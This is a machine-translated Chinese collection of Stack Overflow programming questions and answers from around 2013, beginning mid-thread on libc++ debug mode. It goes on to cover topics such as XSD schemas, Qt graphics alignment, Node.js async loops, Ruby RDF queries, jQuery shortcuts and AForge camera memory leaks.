根据[这段对话](http://clang-developers.42468.n3.nabble.com/libc-debug-mode-td3336742.html)，

> 谢谢克里斯。我已经检查了这个的实验实现。
> 
> -D_LIBCPP_DEBUG2
> 
> 为您提供“标准”调试模式，其中包括检查迭代器失效。
> 
> -D_LIBCPP_DEBUG2=0
> 
> 让你“调试精简版”。这只检查真正便宜的东西，比如你提到的那些。
> 
> 我把门开着是为了：
> 
> -D_LIBCPP_DEBUG2=2
> 
> 这将进行更昂贵的检查（例如检查红/黑树的不变量）。但目前还没有这样做。
> 
> 在这一点上，我仍然只专注于矢量。
> 
> 霍华德

当我用 Xcode 5.0.x（当前最新版本的 Xcode）尝试这个标志时，`_LIBCPP_DEBUG2=1`它不起作用，因为它需要链接到 libcpp 的调试支持运行时代码，该代码是专门为调试 libcpp 本身而编写的。但是`_LIBCPP_DEBUG2=0`在没有链接到调试支持运行时的情况下工作，并且目前为我提供了非常有用的断言，例如调用`std::vector<T>::back()`空向量。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-04-11T06:47:09.780

只是为了更新这一点：以下似乎有效并且至少可以捕获您想要在 10.9 上捕获的主要错误：

```
-D_LIBCPP_DEBUG=0 
```

10.9 中的 clang++ 似乎不支持任何高于级别 0 的内容

# jasper-reports - Openerp 使用 Jasper Report 的子报表

> ID：15899940
> 
> 赞同：1
> 
> 时间：2013-04-09T10:51:09.780
> 
> 标签：jasper-reports, openerp

我想用 Jasper Report 创建一个销售订单报告。因此，我通过 Jasper 的 openerp 数据模板获取了 sale_order 对象的 xml，并在该 xml 文件中设置了深度 3。然后，我使用 Jasper Report 创建了报告。之后，我使用 openerp 的新 Jasper Report 添加了此报告。我的报告在主报告中有一个用于 sale_order_lines 的数据集。所以，我在下面有一个错误：

**openerp.netsvc：报告错误无法在类 com.nantic.jasperreports.JasperServer 中调用方法执行：评估表达式时出错：源文本：$P{REPORT_DATA_SOURCE}.subDataSource("//sub_report")**

如何修复此错误？如果你不介意，请一步一步解释我。

# javascript - 使用 javascript 将 html 节点替换为字符串

> ID：15899943
> 
> 赞同：1
> 
> 时间：2013-04-09T10:51:20.153
> 
> 标签：javascript, html, svg, nodes

我有一个与此类似的 HTML 文档。

```
<html>
    <body>
            <h1>My Embeded SVG</h1>
            <p>This is my html page with some embedded SVG</p>
            <svg id="mySVG"></svg>
            <textarea id="userbox"></textarea>
            <input type="button" value="Replace" OnClick="replaceText()"/> 
    </body>
</html> 
```

我需要能够用来自文本区域的用户生成的字符串替换节点。我编写了一个 JavaScript 函数来执行此操作....但是，它替换了整个 HTML 文档。

```
function replaceText(){
    var allText = document.getElementById("userbox").value;
    var newDoc = document.open("text/svg", "replace");
    newDoc.write(allText);
    newDoc.close();
} 
```

有什么方法可以替换 SVG 节点。

来自用户的文本将与此类似。

```
<svg id="mySVG" width="100%" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path id="javascript" d="M 448 0 L 1045 0 L 896 40 L 846 159 L 746 378 z" fill="rgba(092,000,214,0.36)" stroke="black"></path></svg> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T11:01:40.987

你可以这样做：

```
<h1>My Embeded SVG</h1>
<p>This is my html page with some embedded SVG</p>
<div id="svgContainer">
    <svg id="mySVG"></svg>
</div>
<textarea id="userbox"></textarea>
<input type="button" value="Replace" OnClick="replaceText()"/> 
```

javascript是这样的：

```
// replace below line with the real variable coming from the user input.
var strFromUser = '<svg id="mySVG" width="100%" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path id="javascript" d="M 448 0 L 1045 0 L 896 40 L 846 159 L 746 378 z" fill="rgba(092,000,214,0.36)" stroke="black"></path></svg>'

var container = document.getElementById("svgContainer");

container.innerHTML = strFromUser; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:56:42.553

您不应该使用`write()`或`writeln()`在页面呈现后使用。这确实会清除整个页面。

您需要做的是将`SVG`放在 a`<DIV>`或其他标签中。然后`getElementById()`，并用用户输入的值`DIV`更改它。`innerHTML`

附言。当心你有`textarea`id `userbox`，但在你使用的 JS 中`saveBox`

# joomla - 模块中的子菜单显示

> ID：15899947
> 
> 赞同：0
> 
> 时间：2013-04-09T10:51:32.387
> 
> 标签：joomla, menu, joomla2.5, joomla-extensions, submenu

我想在一个模块中显示子菜单意味着如果在主页中添加了 3 个子菜单，另一个菜单有 5 个子菜单，所以我希望当用户单击主页时，然后在模块中只显示主页的 3 个子菜单，而不是另一个子菜单。

有可能的 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T13:54:25.733

这是 Joomla 菜单模块的标准行为。

如果要在单独的位置显示子菜单，只需将菜单分配给两个不同的模块。在第一个模块中，将第一个和最后一个级别设置为 1，在第二个模块中，将第一个设置为 2，最后一个设置为全部。

# xml - 如何在 xsd 模式中定义可以包含一个或多个属性的 XML 元素？

> ID：15899949
> 
> 赞同：1
> 
> 时间：2013-04-09T10:51:48.190
> 
> 标签：xml, xsd

我在我的项目中使用 MVVM 模式。我通过 XML 描述一个视图。但是我需要将它拆分成几个 XML 文件，因为一个 XML 文件会太大。

当我的解析器读取 XML 时，它首先找到“源”属性。如果存在，则解析器加载其他 XML 文档并从该文档中读取元素。否则，如果“源”属性不存在解析器读取其他属性。

具有 Source 属性的示例：

```
<RibbonDefaultPageCategory>
  <RibbonPage
    Source="DefaultPageCategory/RibbonPage.xml"/>
</RibbonDefaultPageCategory> 
```

没有 Source 属性的示例：

```
<RibbonDefaultPageCategory>
  <RibbonPage
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:noNamespaceSchemaLocation="_Schema.xsd"
    RibbonPageTitle="RibbonPageTitle">
     ...
   </RibbonPage> 
```

是否可以在 XML 模式中定义这种行为？也许可以使用 XML Element 而不是属性？

像这样

```
<ExternalElement
    ElementName="RibbonPage"
    Path="DefaultPageCategory/RibbonPage.xml"/> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T15:09:01.937

不能使用属性，但可以使用元素。像这样的东西：

```
<xs:element name="RibbonPage">
  <xs:complexType>
    <xs:choice>
      <xs:element name="Source" type="xs:string"/>
      <xs:sequence>
        <xs:element name="RibbonPageTitle" type="xs:string"/>
        <!--
           ...place here the definiton of other elements defining the properties of 'RibbonPage'
        -->
      </xs:sequence>
    </xs:choice>
  </xs:complexType>
</xs:element> 
```

验证任一

```
<RibbonPage>
  <Source>...</Source>
</RibbonPage> 
```

或者

```
<RibbonPage>
  <RibbonPageTitle>...</RibbonPageTitle>

</RibbonPage> 
```

但不允许两者`Source`同时`RibbonPageTitle`进行。

另一种方法是使用两个不同的元素名称 - 例如`RibbonPageRef`，当定义在其他地方并且`RibbonPage`值在元素本身中正确时：

```
<xs:element name="RibbonDefaultPageCategory">
  <xs:complexType>
    <xs:choice>
      <xs:element name="RibbonPageRef">
        <xs:complexType>
          <xs:attribute name="Source" type="xs:string"/>
        </xs:complexType>
      </xs:element>
      <xs:element name="RibbonPage">
        <xs:complexType>
          <xs:attribute name="RibbonPageTitle" type="xs:string"/>
          <!--
             ...
          -->
        </xs:complexType>
      </xs:element>
    </xs:choice>
  </xs:complexType>
</xs:element> 
```

这样，有效的 XML 文件是：

```
<RibbonDefaultPageCategory>
  <RibbonPageRef Source="..."/>
</RibbonDefaultPageCategory> 
```

或者

```
<RibbonDefaultPageCategory>
  <RibbonPage RibbonPageTitle="..."/>
</RibbonDefaultPageCategory> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T14:01:03.787

人们经常忽略在模式验证之前进行转换的可能性。当您有一个处理管道时，在验证步骤之前有某种“规范化”步骤通常是非常合理的。主要缺点是很难根据源文档定位验证错误的原因。

# google-keep - Google Keep 应用的 API？

> ID：15899952
> 
> 赞同：58
> 
> 时间：2013-04-09T10:51:58.077
> 
> 标签：google-keep

是否有用于 Google Keep 应用的 API？

能够为桌面创建小部件会很酷。

# c++ - qt图形场景中qtgraphics项目的对齐方式

> ID：15899956
> 
> 赞同：1
> 
> 时间：2013-04-09T10:52:23.530
> 
> 标签：c++, qt, user-interface, graphics

我有一个图形视图，其中包含一个带有一些图形项目的场景。如何使这些图形项目出现在场景的左侧而不是中心？

我浏览了很多想法，但没有运气。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T11:00:10.917

最简单的方法是添加一个不可见`QGraphicsRectItem`的作为第一项。

然后将其他项目添加为第一个项目的子项。

第一项的中心是协调的中心。

```
QGraphicsScene *scene = new QGraphicsScene(widget.graphicsView);

// ....

QGraphicsRectItem *frame = scene->addRect(-100,-100,100,100);
frame->setPen(Qt::NoPen);

// ....

// Add new items as children of frame
// Align them relative to their parent 
```

```
 ^
                           |
                           |
        -100,100           |            100,100
            +-----------------------------+
            |              |              |
            |              |              |
            |              |              |
            |              |              |
            |              |              |
            |              |              |
            |              |              |
---------------------------+------------------------>
            |              |              |
            |              |              |
            |              |              |
            |              |              |
            |              |              |
            |              |              |
            |              |              |
            +-----------------------------+
        -100,100           |            100,-100
                           | 
```

要让它知道窗口大小，请覆盖这些方法：

```
class MainForm : public QMainWindow
{
//...

QGraphicsScene *scene;     // Move it here
QGraphicsRectItem *frame;  // Move it here

protected:
    virtual void resizeEvent(QResizeEvent * event);
    virtual bool event(QEvent * event);
    virtual void resizeAction();
//...
};

void MainForm::resizeAction()
{
    QRectF rect(field->rect());
    widget.graphicsView->setSceneRect(rect);
    widget.graphicsView->fitInView(rect, Qt::KeepAspectRatio);
}

void MainForm::resizeEvent(QResizeEvent * event)
{
    resizeAction();
    QMainWindow::resizeEvent(event);
}

bool MainForm::event(QEvent * event)
{
    if (event->type() == QEvent::Show)
        resizeAction();

    return QMainWindow::event(event);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-10T07:49:15.593

```
Scene_item.setSceneRect(x0,y0,x1,y1); 
```

# java - 在网页中搜索..Android

> ID：15899957
> 
> 赞同：1
> 
> 时间：2013-04-09T10:52:25.937
> 
> 标签：java, android, search, web-applications

我需要在网页中搜索..我开发和 android 应用程序..当用户按下按钮时，网页将被打开，但我需要用户输入关键字，当用户按下按钮时，该关键字必须在网页内搜索..我在这里提供我的 coe，你能建议我接下来要做的事情吗

```
Override
    public void onCreate(Bundle savedInstanceState) 
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        btn1=(Button) findViewById(R.id.button1);
        ev = (EditText) findViewById(R.id.editText1);

        btn1.setOnClickListener(new View.OnClickListener() 
        {

            @Override
            public void onClick(View v) 

            {
                 Intent intent = new Intent(Intent.ACTION_VIEW,
                 Uri.parse("http://www.androidaspect.com"));

                 startActivity(intent);    
            }
       });
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:59:11.697

首先，您需要将 url 加载到您的 [WebView](http://developer.android.com/reference/android/webkit/WebView.html)中。然后 [在您的 Webview 中使用 javascript](http://developer.android.com/guide/webapps/webview.html#UsingJavaScript)进行搜索。您可以使用此 javascript 进行搜索

```
$(document).ready(function() {
    function trim(value) {
        var temp = value;
        var obj = /^(\s*)([\W\w]*)(\b\s*$)/;
        if (obj.test(temp)) {
            temp = temp.replace(obj, '$2');
        }
        var obj = / +/g;
        temp = temp.replace(obj, " ");
        if (temp == " ") {
            temp = "";
        }
        return temp;
    }
    var body = $('body');

    SearchQueue("of Micro");

    function SearchQueue(text) {
        if (text !== null) {
            text = text.replace(/^\s*$[\n\r]{1,}/gm, ''); // Removing empty line breaks
            text = text.replace(/”/g, "\"");
            text = text.replace(/“/g, "\"");
            text = text.replace(/”/g, "\"");
            text = text.replace(/’/g, "\'");
            text = text.replace(/‘/g, "\'");
            text = text.replace(/–/g, "\-");
            text = text.replace(/—/g, "\-");
            text = text.replace(/–/g, "\-");
            var txt1 = text;
            text = trim(txt1);
            var SearchItems = text.split(/\r\n|\r|\n/);
            var replaced = body.text();
            for (var i = 0; i < SearchItems.length; i++) {
                var tempRep = '<span class="highlight" style="background-color: yellow">';
                tempRep = tempRep + SearchItems[i];
                tempRep = tempRep + '</span>';
                replaced = replaced.replace(SearchItems[i], tempRep);
            }
            $("body").html(replaced);
        }
    }
    shortcut.add("Ctrl+Z", function() {
        $('.highlight').toggleClass();
    });

    shortcut.add("Ctrl+V", function() {
        var txt = window.clipboardData.getData("Text");
        var ClipText = txt.replace(/[a-zA-Z0-9\?\&\=\%\#]+s\=(\w+)(\&.*)?/, "$1");
        SearchQueue(ClipText.replace(/\%20|\+/g, "\|"));
    });
}); 
```

# node.js - 如何在代码中实现顺序流

> ID：15899958
> 
> 赞同：0
> 
> 时间：2013-04-09T10:52:26.790
> 
> 标签：node.js, mongoose

有没有办法在 node.js 中按顺序运行代码，我正在尝试运行下面的代码，但我没有按预期工作

```
for(var i =0; i < userList.length; i++) {
console.log("============userList========="+userList[i]);

    Db.findOne({"_id" : Number(userList[i])}, { "flag" : 1 }, function(err, result) {
    if(result && (result.get("flag.notify") === true)) {
        console.log("========my condition========="+result);
    }
    });
}

console.log("===reached here===");
callback(null, MyResult); 
```

我希望上面的代码迭代并检查数据库中的条件，但这不会发生在这里。有什么线索吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T11:29:28.340

有一个非常好的 node.js 库“async”用于管理异步环境中的控制流。对于这个特定的问题使用[https://github.com/caolan/async#forEach](https://github.com/caolan/async#forEach)系列版本可以帮助您解决这个问题

```
async.forEachSeries(userList,function(user,cb){
console.log("============userList========="+user);

Db.findOne({"_id" : Number(user)}, { "flag" : 1 }, function(err, result) {
if(result && (result.get("flag.notify") === true)) {
    console.log("========my condition========="+result);
}
cb();
});
},function(err){
console.log("===reached here===");
callback(null, MyResult);
}) 
```

可能存在一些语法问题，但它向您展示了解决问题的一些方向。

# ruby - Ruby RDF 查询 - 从 Seq 和 Bag 项中提取简单数据

> ID：15899961
> 
> 赞同：4
> 
> 时间：2013-04-09T10:52:33.793
> 
> 标签：ruby, rdf

我正在接收 xml 序列化的 RDF（作为 XMP 媒体描述的一部分，以防万一），并在 Ruby 中进行处理。我正在尝试使用`rdf`gem，尽管很高兴看到其他解决方案。

我已经设法加载和查询最基本的数据，但是在尝试为包含序列和包的项目构建查询时被卡住了。

示例 XML RDF：

```
<rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'>
 <rdf:Description rdf:about='' xmlns:dc='http://purl.org/dc/elements/1.1/'>
  <dc:date>
   <rdf:Seq>
    <rdf:li>2013-04-08</rdf:li>
   </rdf:Seq>
  </dc:date>
 </rdf:Description>
</rdf:RDF> 
```

我将查询放在一起的最佳尝试：

```
require 'rdf'
require 'rdf/rdfxml'
require 'rdf/vocab/dc11'

graph = RDF::Graph.load( 'test.rdf' )

date_query = RDF::Query.new( :subject => { RDF::DC11.date => :date } )

results = date_query.execute(graph)

results.map { |result| { result.subject.to_s => result.date.inspect  } }

 => [{"test.rdf"=>"#<RDF::Node:0x3fc186b3eef8(_:g70100421177080)>"}] 
```

我的印象是我在这个阶段的结果（“查询解决方案”？）是对`rdf:Seq`容器的引用。但我不知道如何进步。对于上面的示例，我希望最终得到一个 array `["2013-04-08"]`。

当有没有`rdf:Seq`和容器的传入数据时，我可以按照[http://rdf.rubyforge.org/RDF/Query.html](http://rdf.rubyforge.org/RDF/Query.html)上的示例`rdf:li`提取我想要使用的字符串- 不幸的是，我找不到更复杂查询的任何示例或用 Ruby 处理的 RDF 结构。`RDF::Query`

编辑：此外，当我尝试找到与`RDF::Node`对象一起使用的适当方法时，我看不到任何方法来探索它可能具有的任何进一步关系：

```
results[0].date.methods - Object.methods
 => [:original, :original=, :id, :id=, :node?, :anonymous?, :unlabeled?, :labeled?, :to_sym, :resource?, :constant?, :variable?, :between?, :graph?, :literal?, :statement?, :iri?, :uri?, :valid?, :invalid?, :validate!, :validate, :to_rdf, :inspect!, :type_error, :to_ntriples]
# None of the above leads AFAICS to more data in the graph 
```

我知道如何在 xpath 中获取相同的数据（好吧，至少假设我们在序列化中总是获得相同的路径），但觉得它不是在这种情况下使用的最佳查询语言（这是我的备份计划，但是，如果事实证明，实现 RDF 查询解决方案过于复杂）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-13T10:13:54.107

我认为你说“我在这个阶段的结果（“查询解决方案”？）是对 rdf:Seq 容器的引用是正确的。RDF/XML 是一种非常可怕的序列化格式，而是将数据视为图形。这是一张 RDF:Bag 的图片。RDF:Seq 的工作原理相同，示例中的 #students 类似于您的案例中的 #date。![RDF:Bag 例子，RDF:Seq 是一样的](https://i.stack.imgur.com/eWFcu.png)

因此，要获取日期文字，您需要在图中进一步跳一个节点。我不熟悉这个 Ruby 库的语法，但类似：

```
require 'rdf'
require 'rdf/rdfxml'
require 'rdf/vocab/dc11'

graph = RDF::Graph.load( 'test.rdf' )

date_query = RDF::Query.new({
  :yourThing => {
    RDF::DC11.date  => :dateSeq
  },
  :dateSeq => {
      RDF.type => RDF.Seq,
      RDF._1 => :dateLiteral
  }
})

date_query.execute(graph).each do |solution|
  puts "date=#{solution.dateLiteral}"
end 
```

当然，如果您希望 Seq 实际上包含多个日期（否则拥有 Seq 就没有意义），您必须将它们与`RDF._1 => :dateLiteral1`,`RDF._2 => :dateLiteral2`等匹配`RDF._3 => :dateLiteral3`。

或者对于更通用的解决方案，将 dateSeq 上的所有属性和对象与：

```
:dateSeq => {
    :property => :dateLiteral
} 
```

然后过滤掉`:property`最终成为`RDF:type`while`:dateLiteral`实际上不是日期而是`RDF:Seq`. 也许图书馆也有一个特殊的方法来获取所有 Seq 的内容。

# javascript - 在 iframe 页面中的 .toggle 上重新调整 iframe 大小

> ID：15899966
> 
> 赞同：0
> 
> 时间：2013-04-09T10:52:41.433
> 
> 标签：javascript, jquery, iframe, resize, toggle

我浏览了类似的帖子，但没有找到与我的场景真正相关的任何内容。

我有一个摘要页面，其中有`iframe`几个页面，用户在前往摘要页面的途中已经浏览了这些页面。在每个被 iframe 的页面中。我`.toggle`用来展开/折叠页面的内容。

我发现的问题是我在第一次加载摘要页面时使用了一个脚本来调整`iframe`它所包含的页面内容的大小，但是当我单击以切换该内容并折叠它时，它保持`iframe`相同的大小，因此有一大块空白。

我猜我需要将内容从包含的页面发送回摘要页面，说明内容大小已更改，因此重新调整大小，`iframe`但不确定如何执行此操作。

有人可以指出我正确的方向吗？

文件的一个例子是...

父.html

```
<link rel="stylesheet" type="text/css" href="styles.css" />
<script type="text/javascript">        
    // Resize an iframe so it's as tall as its contents. This could be much shorter but is expanded for clarity.
    function size_frame(frame_name, frame_id)
    {
       // Get the iframe element
       var frame_element = document.getElementById(frame_id);           
       // Get the iframe frame-window object. Note this has different properties to frame_element.
       var frame_window = frames[frame_name];           
       // Set the height to 1px first, because some browsers will give you the maximum height of either the
       // frame or its contents, when you try to read the scrollHeight property as we do below.
       frame_element.style.height = "1px";           
       // set the height of the iframe element to the "scrollHeight" of the document element of the frame window.
       frame_element.style.height = frame_window.document.documentElement.scrollHeight +"px";           
    }    
</script>
<h1>SUMMARY</h1>
<table border="0" cellspacing="0" cellpadding="0" width="850">
    <tr>
        <td><iframe src="child1.html" width="850" frameborder="0" scrolling="no" name="child1" id="child1" onload="size_frame('child1','child1');"></iframe></td>
    </tr>
</table> 
```

儿童.html：

```
<link rel="stylesheet" type="text/css" href="styles.css" />
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script> 
<script type="text/javascript">
    $().ready(function () {
        $('th[event-type-header]').bind('click', function () {
            var eventType = $(this).attr('event-type-header');
            $('tr[event-type="' + eventType + '"]').toggle('hide-event-type');
        });
    });
</script>
<h1>Child Page</h1>

<table width="800" border="0" cellspacing="0" cellpadding="0" class="content">
    <tr>
        <th class="content" event-type-header="childPage">
            Header <img src="arrow_down.gif" align="right" width="15" />
        </th>
    </tr>
    <tr class="content2" event-type="childPage">
        <td align="center">
            <table width="750" cellpadding="0" cellspacing="0" class="content">
                <tr>                        
                    <th class="content" colspan="2">Sub Heading</th>
                </tr>
                <tr class="content2">
                    <td>
                        Some Text           
                    </td>
                </tr>                           
            </table>
        </td>
    </tr>
</table> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-12T20:52:19.603

您需要使用 offsetHeight，而不是 scrollHeight。

# jquery - 使用jQuery为输入按钮分配快捷键

> ID：15899967
> 
> 赞同：1
> 
> 时间：2013-04-09T10:52:48.183
> 
> 标签：jquery

```
<html>
<script>
$('#pasteButton').click( function() {

  // place code for this button
  // ctrl + v shortcut should work for this button
  // how?
  }

});

</script>
<body>
    <input type="button" id="pasteButton" value="Paste" />
</body>
</html> 
```

提前致谢。同样，我还需要使用按钮从文本区域剪切/复制选定的文本。

*从评论部分更新：我有一个文本区域，我在其中选择了一些文本，如果我单击 pasteButton，则需要将所选文本粘贴到我的文本区域中*

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-09T11:03:11.377

首先，您必须收听 keydown 事件。如果是 control+v 那么你可以触发你的函数你可以使用下面的代码来达到这个目的：

**HTML**

```
<input type="button" name="pasteButton" value="press me" id="pasteButton"/> 
```

**JAVASCRIPT**

```
 $(window).keydown(function(event) {
          if(event.ctrlKey && (event.which == 86 || event.which==118)) { 
              $('#pasteButton').trigger("click")
            event.preventDefault(); 
          }
        });
        $('#pasteButton').click( function(){
            alert("hello");
        }); 
```

[示例 JSFIDDLE](http://jsfiddle.net/arjuncc/cjXtW/3/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T10:57:17.003

取自这篇文章：

[如何使用 JavaScript 检测 Ctrl+V、Ctrl+C？](https://stackoverflow.com/questions/2903991/how-to-detect-ctrlv-ctrlc-using-javascript)

```
$(document).ready(function()
{

    $('#pasteButton').click( function()
    {
        // Your click functionality here
    }

    var ctrlDown = false;
    var ctrlKey = 17, vKey = 86;

    $(document).keydown(function(e)
    {
        if (e.keyCode == ctrlKey) ctrlDown = true;
    }).keyup(function(e)
    {
        if (e.keyCode == ctrlKey) ctrlDown = false;
    });

    $(document).keydown(function(e)
    {
        if (ctrlDown && e.keyCode == vKey) {
           // ctrl + V clicked, click the paste button.

           $('#pasteButton').click();
           return false;
        };
    });
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-09T06:54:46.290

只需使用html 标记的**accesskey属性以获取更多详细信息，请参见以下链接**

[http://www.w3schools.com/tags/att_global_accesskey.asp](http://www.w3schools.com/tags/att_global_accesskey.asp)

# java - 如何使用 java 以编程方式对 selenium 网格进行操作

> ID：15899968
> 
> 赞同：0
> 
> 时间：2013-04-09T10:52:53.327
> 
> 标签：java, selenium-grid

嗨，我只需要你的帮助，当我们使用 SELENIUM GRID 时，我们应该通过语句添加 No of RC（我们想要多少）作为

ANT -DPORT - 5554 -DENVIRONMENT - 火狐.....

ANT -DPORT - 5554 -DENVIRONMENT - 铬.....

我们必须像上面一样添加 RC。我的问题是**这是手动过程**， ***如何在自动化（Java）自动/编程中做到这一点*。**
我多次遇到这个问题，所以请告诉我完美的答案。

谢谢

# windows-phone-8 - wp8如何启动位置设置任务？

> ID：15899969
> 
> 赞同：1
> 
> 时间：2013-04-09T10:53:00.800
> 
> 标签：windows-phone-8

我注意到一个名为 quick-settings 的应用程序有一个可以启动位置设置任务的功能（见下面的链接），但我在 wp8 API 列表中找不到该任务，你能告诉我它是什么吗？

[http://www.windowsphone.com/en-us/store/app/quick-settings/2a2cbaa7-6d75-420c-ae14-2339618da43e](http://www.windowsphone.com/en-us/store/app/quick-settings/2a2cbaa7-6d75-420c-ae14-2339618da43e)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-11T10:42:53.867

抱歉问题不清楚，现在我得到了答案，这里是：

```
var op = await Windows.System.Launcher.LaunchUriAsync(new Uri("ms-settings-location:")); 
```

一样的谢谢！！

# memory-leaks - AForge 相机内存泄漏

> ID：15899970
> 
> 赞同：3
> 
> 时间：2013-04-09T10:53:03.127
> 
> 标签：memory-leaks, camera, aforge

我正在用 C# 开发一个应用程序，并且我开发了一个用`Aforge`相机做一些事情的库。要点之一是简单地捕获网络摄像头前面的图像并将其显示在特定`PictureBox`的位置上：

```
camera.NewFrame += NewFrame;

private void NewFrame(object sender, NewFrameEventArgs args)
    {
        Bitmap newFrame = new Bitmap(args.Frame);
        args.Frame.Dispose();
        PictureBox.FromBitmapImage(newFrame);
        newFrame.Dispose();
        newFrame = null;
    } 
```

我在这里所做的，我获取每一帧并将其绘制到`PictureBox`.

**我的疑问是：**

在某些计算机中，这种绘制方式会产生非常高的内存泄漏。相机配置为：**640x480**，如果更高，内存泄漏会增加。

电脑配置：

**Intel i5：**内存泄漏到 500Mb

**Intel i7：**没有内存泄漏。

**双心（没那么强大）：**没有那么多内存泄漏。

**编辑：**

```
 public static void FromBitmapImage(this Image image, Bitmap bitmap)
    {
        BitmapImage bitmapImage = new BitmapImage();

        using (MemoryStream memoryStream = new MemoryStream())
        {
            bitmap.Save(memoryStream, ImageFormat.Bmp);
            memoryStream.Position = 0;
            bitmapImage.BeginInit();
            bitmapImage.StreamSource = memoryStream;
            bitmapImage.CacheOption = BitmapCacheOption.OnLoad;
            bitmapImage.EndInit();
        }

        image.Source = bitmapImage;
        bitmapImage = null;
    } 
```

我不明白为什么我在某些计算机中存在内存泄漏，而在其他计算机中没有...请提供任何建议？

**注意：**内存泄漏仅在 Visual Studio 2010 的发布模式下发生，而不是在调试时发生。

**注意2：**我认为问题来自于`FromBimapImage`，因为我尝试了一个`WindowsForms`应用程序而不是一个应用程序`WPF`并且没有内存泄漏......

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-09T19:30:41.020

AForge[拥有](http://www.aforgenet.com/framework/docs/html/3c0dd0f0-680a-373a-6518-626f4f29bc7b.htm)图像的字节，您应该制作自己的**深**拷贝。将帧传递给 Bitmap 构造函数是不够的。如果框架由于您对位图的引用而无法正确处理位图，则存在泄漏。

试试这个：

```
private void NewFrame(object sender, NewFrameEventArgs args)
{
    Bitmap newFrame = AForge.Imaging.Image.Clone(args.Frame);
    PictureBox.FromBitmapImage(newFrame);
    newFrame.Dispose();
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-09-09T23:41:20.793

这对我有用。

```
 if (pictureBox1.Image != null) {
            pictureBox1.Image.Dispose();
        }
        Bitmap bitmap = eventArgs.Frame.Clone() as Bitmap;
        pictureBox1.Image = bitmap; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-07-25T07:16:08.527

在分配新图片之前处理图片框图像可以防止内存泄漏，但是当我调整图片框大小时会出错。问题可能是由于过早地处理图像。它对我有用的是将旧图像保留在队列中，并延迟 5 个图像处理它们。这将使图片框有足够的时间赶上。

```
private Queue<Image> _oldImages = new Queue<Image>();
...

if (pictureBox1.Image != null)
{
  _oldImages.Enqueue(pictureBox1.Image);
  if (_oldImages.Count > 5) 
  {
    var oldest = _oldImages.Dequeue();
    oldest.Dispose();
  }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2022-01-30T11:36:43.173

我们根据它的比例等使用图片框中的图像，所以我不想处理它并且在picturebox.image中有一个空图像。所以这个小变通方法已被证明是最有效的。

我们最近部署到一台 Windows 7 机器上，我注意到内存泄漏。我发现它似乎是“导致”泄漏的图片框，或者更确切地说是我通过不处理图片框。来自新框架的新picturebox.image，RAM（内存使用）变得完全稳定。不需要调用垃圾收集器，正如有人曾经说过的那样，“如果你需要调用垃圾收集器，那么你首先做错了什么”。（这个在win10有效，很快会在win7中测试）

额外的：

对于一次运行多个视频源也很有用，是使用帧切换整数变量并在每一帧 ++，如果 frameToggle 大于 2 然后设置回 0 并且仅在 frameToggle == 时将帧设置为图片框1个；有效地跳帧。我发现这对于图像捕获帧速率不是那么重要的速度较慢的机器非常有用。

图片框。图像处理：

```
 private void VideoFeedCustID_NewFrame(object sender, NewFrameEventArgs eventArgs)
    {
        try
        {
            if (eventArgs.Frame != null)
            {
                Image oldImage = CustIDPictureBox.Image; 
                CustIDPictureBox.Image = (Bitmap)eventArgs.Frame.Clone();
                if (oldImage != null) { oldImage.Dispose(); }
            }
        }
        catch (Exception ex)
        {
            custIDCameraActive = false;
            MessageBox.Show("Camera Settings Frame Feed - Error: \n\n" + ex.Message, "Error");
        }
    } 
```

FrameToggle 用于性能改进：

```
 private void VideoFeedCustID_NewFrame(object sender, NewFrameEventArgs eventArgs)
    {
        try
        {
            if (frameToggle == 1)
            {
                if (eventArgs.Frame != null)
                {
                    Image oldImage = CustIDPictureBox.Image;
                    CustIDPictureBox.Image = (Bitmap)eventArgs.Frame.Clone();
                    if (oldImage != null) { oldImage.Dispose(); }
                }
            }
            else if (frameToggle > 3)
            {
                frameToggle = 0;
            }
            frameToggle++;
        }
        catch (Exception ex)
        {
            custIDCameraActive = false;
            MessageBox.Show("Camera Settings Frame Feed - Error: \n\n" + ex.Message, "Error");
        }
    } 
```

# eclipse - 关闭 Eclipse 验证

> ID：15899976
> 
> 赞同：34
> 
> 时间：2013-04-09T10:53:33.517
> 
> 标签：eclipse, validation

我想完全关闭所有语言的 Eclipse 验证。

这与禁用各种模式的验证不同，我不希望 Eclipse 甚至尝试验证。

版本是朱诺。

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2013-04-09T11:05:54.933

> 单击窗口 > 首选项，然后在左侧窗格中选择验证。Preferences 窗口的 Validation 页面列出了项目中可用的验证器及其设置。
> 
> 要禁用单个验证器，请清除要禁用的每个验证器旁边的复选框。每个验证器都有一个复选框来指定是否启用手动验证或构建。

[看这里](http://help.eclipse.org/indigo/index.jsp?topic=/org.eclipse.jst.j2ee.doc.user/topics/tjvaldisable.html)

